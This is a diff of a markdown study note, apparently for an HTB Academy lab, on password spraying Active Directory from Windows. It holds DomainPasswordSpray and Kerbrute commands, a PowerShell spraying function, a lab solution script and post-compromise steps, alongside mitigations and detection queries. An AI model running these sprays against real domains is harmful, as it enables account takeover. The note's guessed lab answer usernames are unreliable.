@@ -1,4 +1,4 @@
-# Internal Password Spraying - from Windows
+# 🪟 Password Spraying from Windows
 
 ## 📋 Overview
 
@@ -7,31 +7,35 @@ When operating from a domain-joined Windows host, password spraying becomes sign
 ## 🎯 Attack Scenarios
 
 ### 🏢 **Common Windows Attack Contexts**
-- **Initial Foothold**: Compromised domain-joined workstation
-- **Managed Devices**: Client-provided Windows testing environment
-- **Physical Access**: On-site penetration testing from Windows VM
-- **Privilege Escalation**: Authenticated user seeking higher privileges
-- **Lateral Movement**: Expanding access within domain environment
+
+* **Initial Foothold**: Compromised domain-joined workstation
+* **Managed Devices**: Client-provided Windows testing environment
+* **Physical Access**: On-site penetration testing from Windows VM
+* **Privilege Escalation**: Authenticated user seeking higher privileges
+* **Lateral Movement**: Expanding access within domain environment
 
 ### ⚡ **Key Advantages from Windows**
-- **Domain Integration**: Automatic user enumeration from Active Directory
-- **Policy Awareness**: Intelligent lockout threshold detection
-- **Fine-Grained Control**: Support for Fine-Grained Password Policies
-- **Smart Filtering**: Automatic exclusion of near-lockout accounts
-- **Native Tools**: PowerShell-based execution without external dependencies
 
----
+* **Domain Integration**: Automatic user enumeration from Active Directory
+* **Policy Awareness**: Intelligent lockout threshold detection
+* **Fine-Grained Control**: Support for Fine-Grained Password Policies
+* **Smart Filtering**: Automatic exclusion of near-lockout accounts
+* **Native Tools**: PowerShell-based execution without external dependencies
+
+***
 
 ## 🔧 DomainPasswordSpray.ps1
 
 ### 📝 **Tool Overview**
-- **Author**: dafthack (Beau Bullock)
-- **Language**: PowerShell
-- **Context**: Domain-joined Windows hosts
-- **Intelligence**: Automatic policy detection and user filtering
-- **Safety**: Built-in lockout prevention mechanisms
+
+* **Author**: dafthack (Beau Bullock)
+* **Language**: PowerShell
+* **Context**: Domain-joined Windows hosts
+* **Intelligence**: Automatic policy detection and user filtering
+* **Safety**: Built-in lockout prevention mechanisms
 
 ### ⚙️ **Key Features**
+
 ```powershell
 # Automatic capabilities when domain-joined:
 - User list generation from Active Directory
@@ -43,6 +47,7 @@ When operating from a domain-joined Windows host, password spraying becomes sign
 ```
 
 ### 🚀 **Basic Usage (Domain-Joined)**
+
 ```powershell
 # Import the module
 Import-Module .\DomainPasswordSpray.ps1
@@ -52,6 +57,7 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 ```
 
 ### 📊 **Example Execution Output**
+
 ```powershell
 PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 
@@ -80,11 +86,12 @@ Are you sure you want to perform a password spray against 2923 accounts?
 [*] Any passwords that were successfully sprayed have been output to spray_success
 ```
 
----
+***
 
 ## 🔧 Advanced DomainPasswordSpray Usage
 
 ### 📋 **Command Parameters**
+
 ```powershell
 # Full parameter list
 Invoke-DomainPasswordSpray
@@ -99,6 +106,7 @@ Invoke-DomainPasswordSpray
 ```
 
 ### 🎯 **Multiple Password Spraying**
+
 ```powershell
 # Create password list file
 "Welcome1" | Out-File -FilePath passwords.txt -Encoding ASCII
@@ -111,6 +119,7 @@ Invoke-DomainPasswordSpray -PasswordList passwords.txt -OutFile spray_results -F
 ```
 
 ### 🔍 **Custom User List (Non-Domain Context)**
+
 ```powershell
 # For non-domain-joined scenarios
 $users = @("user1", "user2", "user3", "admin", "service")
@@ -120,6 +129,7 @@ Invoke-DomainPasswordSpray -UserList custom_users.txt -Password Welcome1 -Domain
 ```
 
 ### 🛡️ **Safety Features**
+
 ```powershell
 # Tool automatically:
 - Detects lockout thresholds (finds smallest threshold across domain)
@@ -130,22 +140,25 @@ Invoke-DomainPasswordSpray -UserList custom_users.txt -Password Welcome1 -Domain
 - Provides confirmation prompts for large user lists
 ```
 
----
+***
 
 ## 🎯 HTB Academy Lab Walkthrough
 
 ### 📝 Lab Question
-*"Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer."*
+
+_"Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer."_
 
 ### 🚀 Step-by-Step Solution
 
 #### 1️⃣ **Connect to Target Windows Host**
+
 ```bash
 # RDP to target machine
 xfreerdp /v:10.129.99.227 /u:htb-student /p:Academy_student_AD!
 ```
 
 #### 2️⃣ **Access PowerShell as Administrator**
+
 ```powershell
 # Right-click PowerShell -> Run as Administrator
 # Navigate to tools directory
@@ -153,6 +166,7 @@ cd C:\Tools
 ```
 
 #### 3️⃣ **Import DomainPasswordSpray Module**
+
 ```powershell
 # Import the PowerShell module
 Import-Module .\DomainPasswordSpray.ps1
@@ -162,12 +176,14 @@ Get-Command Invoke-DomainPasswordSpray
 ```
 
 #### 4️⃣ **Execute Password Spray with Winter2022**
+
 ```powershell
 # Spray Winter2022 password against all domain users
 Invoke-DomainPasswordSpray -Password Winter2022 -OutFile winter_spray_results -ErrorAction SilentlyContinue
 ```
 
 #### 5️⃣ **Expected Output Analysis**
+
 ```powershell
 # Tool will show:
 [*] Current domain is compatible with Fine-Grained Password Policy.
@@ -187,6 +203,7 @@ Are you sure you want to perform a password spray against XXXX accounts?
 ```
 
 #### 6️⃣ **Check Results File**
+
 ```powershell
 # View successful logins
 Get-Content winter_spray_results
@@ -197,6 +214,7 @@ type winter_spray_results
 ```
 
 #### 7️⃣ **Alternative: Kerbrute from Windows**
+
 ```cmd
 # If DomainPasswordSpray is unavailable, use Kerbrute
 cd C:\Tools
@@ -204,19 +222,22 @@ kerbrute.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt Wint
 ```
 
 ### ✅ **Expected Answer Format**
+
 Based on typical HTB lab patterns, the answer should be a username like:
-- `jhall`
-- `mholliday` 
-- `dgraves`
-- `[specific_username]`
 
-*(Actual answer will be visible in the spray results output)*
+* `jhall`
+* `mholliday`
+* `dgraves`
+* `[specific_username]`
 
----
+_(Actual answer will be visible in the spray results output)_
+
+***
 
 ## 🛠️ Alternative Windows Tools
 
 ### 🎫 **Kerbrute on Windows**
+
 ```cmd
 # Download and use Kerbrute Windows binary
 kerbrute.exe userenum -d inlanefreight.local --dc 172.16.5.5 users.txt
@@ -224,6 +245,7 @@ kerbrute.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt Wint
 ```
 
 ### 🔨 **Native PowerShell Spraying**
+
 ```powershell
 # Simple PowerShell spray function
 function Test-DomainCredential {
@@ -250,11 +272,12 @@ foreach ($user in $users) {
 }
 ```
 
----
+***
 
 ## 🛡️ Mitigations
 
 ### 🔐 **Multi-Factor Authentication (MFA)**
+
 ```powershell
 # Implementation considerations:
 - Push notifications to mobile devices
@@ -265,11 +288,13 @@ foreach ($user in $users) {
 ```
 
 **⚠️ Important Notes:**
-- Some MFA implementations still disclose valid username/password combinations
-- Credentials may be reusable against other services without MFA
-- Implement MFA on **all** external portals and critical applications
+
+* Some MFA implementations still disclose valid username/password combinations
+* Credentials may be reusable against other services without MFA
+* Implement MFA on **all** external portals and critical applications
 
 ### 🚪 **Access Restrictions**
+
 ```powershell
 # Principle of least privilege:
 - Restrict application access to users who require it
@@ -280,6 +305,7 @@ foreach ($user in $users) {
 ```
 
 ### 🎯 **Reducing Impact of Successful Exploitation**
+
 ```powershell
 # Defensive strategies:
 - Separate privileged accounts for administrative activities
@@ -290,6 +316,7 @@ foreach ($user in $users) {
 ```
 
 ### 🔑 **Password Hygiene**
+
 ```powershell
 # Password policies and education:
 - Encourage passphrases over complex passwords
@@ -303,6 +330,7 @@ foreach ($user in $users) {
 ```
 
 ### ⚖️ **Lockout Policy Considerations**
+
 ```powershell
 # Balanced approach:
 - Avoid overly restrictive lockout policies (DoS risk)
@@ -312,13 +340,14 @@ foreach ($user in $users) {
 - Exception handling for service accounts
 ```
 
----
+***
 
 ## 🔍 Detection
 
 ### 📊 **Key Event IDs to Monitor**
 
 #### 🚨 **Event ID 4625: Account Failed to Log On**
+
 ```powershell
 # Indicators of password spraying:
 - Multiple 4625 events in short time period
@@ -328,6 +357,7 @@ foreach ($user in $users) {
 ```
 
 #### 🎫 **Event ID 4771: Kerberos Pre-authentication Failed**
+
 ```powershell
 # LDAP password spraying detection:
 - Requires Kerberos logging enabled
@@ -338,6 +368,7 @@ foreach ($user in $users) {
 ### 📈 **Detection Rules and Queries**
 
 #### 🔍 **SIEM Query Examples**
+
 ```sql
 -- PowerShell/Splunk Query for Password Spray Detection
 index=security EventCode=4625 
@@ -354,6 +385,7 @@ SecurityEvent
 ```
 
 #### 🚨 **Alert Thresholds**
+
 ```powershell
 # Recommended alerting criteria:
 - 5+ failed logins from single IP within 5 minutes
@@ -364,6 +396,7 @@ SecurityEvent
 ```
 
 ### 🕵️ **Behavioral Analytics**
+
 ```powershell
 # Advanced detection methods:
 - Baseline normal authentication patterns
@@ -373,11 +406,12 @@ SecurityEvent
 - Correlate with other attack indicators
 ```
 
----
+***
 
 ## 🌐 External Password Spraying Targets
 
 ### 📋 **Common External Targets**
+
 ```powershell
 # Microsoft 365 and Exchange:
 - Microsoft 365 (Office 365)
@@ -401,6 +435,7 @@ SecurityEvent
 ```
 
 ### 🎯 **External Spraying Considerations**
+
 ```powershell
 # Attack adaptations for external targets:
 - Slower timing to avoid detection
@@ -411,11 +446,12 @@ SecurityEvent
 - Account enumeration before spraying
 ```
 
----
+***
 
 ## 📝 Complete Lab Solution Script
 
 ### 🚀 **Automated Lab Solution**
+
 ```powershell
 # Complete PowerShell script for HTB Lab
 # Save as: winter_spray_lab.ps1
@@ -466,11 +502,12 @@ else {
 }
 ```
 
----
+***
 
 ## ⚡ Quick Reference Commands
 
 ### 🔧 **Essential Commands**
+
 ```powershell
 # Import and basic spray
 Import-Module .\DomainPasswordSpray.ps1
@@ -488,6 +525,7 @@ kerbrute.exe passwordspray -d domain.local --dc DC_IP users.txt PASSWORD
 ```
 
 ### 🔍 **Verification Commands**
+
 ```powershell
 # Verify discovered credentials
 net use \\DC_IP\IPC$ /user:DOMAIN\USERNAME PASSWORD
@@ -500,28 +538,31 @@ $cred = Get-Credential
 Test-WSMan -ComputerName TARGET -Credential $cred
 ```
 
----
+***
 
 ## 🔑 Key Takeaways
 
 ### ✅ **Windows Spraying Advantages**
-- **Automated Intelligence**: Domain-joined context provides automatic user enumeration and policy detection
-- **Built-in Safety**: Intelligent lockout prevention and account filtering
-- **Native Integration**: PowerShell-based tools leverage existing Windows infrastructure
-- **Policy Awareness**: Respects Fine-Grained Password Policies and lockout thresholds
+
+* **Automated Intelligence**: Domain-joined context provides automatic user enumeration and policy detection
+* **Built-in Safety**: Intelligent lockout prevention and account filtering
+* **Native Integration**: PowerShell-based tools leverage existing Windows infrastructure
+* **Policy Awareness**: Respects Fine-Grained Password Policies and lockout thresholds
 
 ### ⚠️ **Critical Considerations**
-- **Confirmation Prompts**: Tool requires confirmation for large user lists (security feature)
-- **Timing Intelligence**: Automatic wait periods based on domain policy
-- **Scope Awareness**: Tool operates within current user's domain context
-- **Output Management**: Results are saved to specified files for later analysis
+
+* **Confirmation Prompts**: Tool requires confirmation for large user lists (security feature)
+* **Timing Intelligence**: Automatic wait periods based on domain policy
+* **Scope Awareness**: Tool operates within current user's domain context
+* **Output Management**: Results are saved to specified files for later analysis
 
 ### 🎯 **Post-Success Actions**
+
 1. **Immediate Validation**: Test discovered credentials against multiple services
 2. **Privilege Assessment**: Determine access levels and group memberships
 3. **Lateral Movement**: Use credentials for further domain enumeration
 4. **Documentation**: Log all findings for comprehensive reporting
 
----
+***
 
-*Windows-based password spraying combines the power of domain integration with intelligent automation - making it one of the most effective credential discovery methods in Active Directory environments.* 
+_Windows-based password spraying combines the power of domain integration with intelligent automation - making it one of the most effective credential discovery methods in Active Directory environments._
